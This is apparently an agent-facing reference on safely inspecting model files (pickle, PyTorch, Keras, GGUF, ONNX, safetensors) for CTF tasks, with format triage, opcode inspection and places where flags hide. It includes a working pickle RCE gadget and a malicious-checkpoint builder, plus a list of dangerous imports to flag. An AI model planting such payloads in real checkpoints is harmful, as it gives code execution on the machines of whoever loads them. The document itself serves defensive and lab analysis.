# Model File Forensics and Unsafe Deserialization

Load when the artifact is a model file (`.pt`, `.pth`, `.ckpt`, `.bin`, `.pkl`, `.joblib`, `.h5`, `.keras`, `.gguf`, `.onnx`, `.safetensors`) and the task is to inspect it safely, recover an embedded secret, or prove a code-execution sink. Never load an untrusted checkpoint in your main environment — inspect bytes first, load only in a throwaway sandbox.

## Format triage by code-execution risk

| Format | Extensions | Load-time code execution |
| --- | --- | --- |
| Pickle | `.pkl`, `.pickle`, `.pt`, `.pth`, `.bin`, `.ckpt`, `.joblib`, `.dill` | Yes — arbitrary, via reducers |
| PyTorch ZIP | `.pt`, `.pth` (ZIP of internal `data.pkl`) | Yes — inner pickle |
| Keras / HDF5 | `.h5`, `.hdf5`, `.keras` | Yes — `Lambda` layers, embedded pickle |
| GGUF | `.gguf` | Template injection (CVE-2024-34359) |
| ONNX | `.onnx` | Path traversal / external-data abuse |
| NumPy | `.npy`, `.npz` | Yes if `allow_pickle=True` |
| Safetensors | `.safetensors` | No — header JSON + raw tensor bytes |

First action: identify the true format, not the extension. `picklescan` and similar tools key off extension and miss a malicious pickle renamed to `.skops`/`.json`/`.keras`. Run `file`, then check magic bytes:
- Pickle protocol 2+ starts with `\x80` followed by the protocol byte.
- PyTorch ZIP / `.keras` / `.npz` start with `PK\x03\x04` (ZIP) — `unzip -l` to list inner members; the dangerous member is `*/data.pkl` or `archive/data.pkl`.
- HDF5 starts with `\x89HDF\r\n\x1a\n`.
- GGUF starts with `GGUF`.
- Safetensors starts with an 8-byte little-endian header length, then JSON.

## Pickle: inspect without executing

Pickle is a stack VM. Reducers (`__reduce__`/`__setstate__`) return `(callable, args)` that run during unpickling, before any weights are touched. Read the opcodes instead of loading:

```bash
python -m pickletools model.pkl          # disassemble opcodes
# or for a PyTorch ZIP:
unzip -o model.pth -d _m && python -m pickletools _m/*/data.pkl
```

Dangerous opcodes/signals to flag: `GLOBAL` / `STACK_GLOBAL` importing `os`, `posix`, `subprocess`, `builtins`, `nt`, `socket`, `runpy`, `pty`; `REDUCE` paired with those; references to `system`, `exec`, `eval`, `__import__`, `Popen`, `getattr`. A clean weights-only pickle imports only `torch`, `collections.OrderedDict`, `numpy`, and tensor rebuild helpers.

Trail of Bits `fickling` gives a verdict and can extract/inject:

```bash
fickling --check-safety model.pkl        # static safety analysis
fickling --trace model.pkl               # show what unpickling would do
```

Scanners for triage (defense-in-depth, each has gaps): `picklescan`, `modelscan` (Protect AI — H5/Pickle/SavedModel), `fickling`.

## Building/recognising a pickle RCE payload

The canonical gadget — recognise it in `pickletools` output, or build it for a lab sink that calls `torch.load`/`pickle.load` on your file:

```python
import os, pickle
class P:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned",))
pickle.dump(P(), open("payload.pkl", "wb"))
# PyTorch checkpoint variant: place the object under an early-deserialized key
import torch
torch.save({"model_state_dict": P()}, "malicious.ckpt")
```

`weights_only=True` is the modern guard (default in PyTorch ≥2.6) but is not absolute: CVE-2025-32434 bypassed it, and CVE-2026-24747 corrupts memory through `SETITEM`/`SETITEMS` opcodes on non-dict types even under the safe unpickler. If the challenge pins an old/vulnerable PyTorch, the safe flag is still in scope.

## Other format-specific sinks

- **Keras/HDF5**: a `Lambda` layer stores a serialized Python function executed on model load. Dump the model config (`h5dump`, or `keras` model JSON) and inspect `Lambda` `function` blobs and `config` for marshalled code. Legacy HDF5 Lambda calling `/bin/sh` is a classic PoC.
- **GGUF (CVE-2024-34359)**: chat-template metadata is rendered with Jinja2; `{{ ... }}`/`{% ... %}` in the template means server-side template injection → RCE. Dump metadata with `gguf-dump`/`llama.cpp` tools and inspect `tokenizer.chat_template`.
- **ONNX**: external-data tensors reference filesystem paths; crafted `external_data` location can traverse paths or read attacker-chosen files. Inspect with `onnx.load` (no execution) and check initializer external-data references.
- **Safetensors**: no code path, but the JSON header carries arbitrary `__metadata__` — a frequent hiding spot for flags/keys. Read the header without loading tensors:

```python
import json, struct
with open("model.safetensors","rb") as f:
    n = struct.unpack("<Q", f.read(8))[0]
    print(json.loads(f.read(n)).get("__metadata__"))
```

## Where secrets hide (recover-the-flag tasks)

- Safetensors / GGUF / ONNX metadata fields and tensor names.
- Pickle `STRING`/`SHORT_BINUNICODE` constants — `strings -n 6` plus `pickletools` for context.
- Tensor values themselves: a flag encoded as ASCII bytes in a weight array (`numpy`/`torch` load in sandbox, then `bytes(tensor.flatten().tolist())`).
- HDF5 attributes and dataset names (`h5ls -r`, `h5dump -A`).
- Embedded files in the ZIP container beyond `data.pkl` (configs, `.txt`, polyglot images).

## Validation

A code-execution claim needs a reproduced sink: show the opcode/reducer (or fickling verdict) and the observed effect (file written, callback) when loaded in the sandbox. A recovered-secret claim needs the exact extraction path (field, tensor, opcode offset) replayable from the file alone.
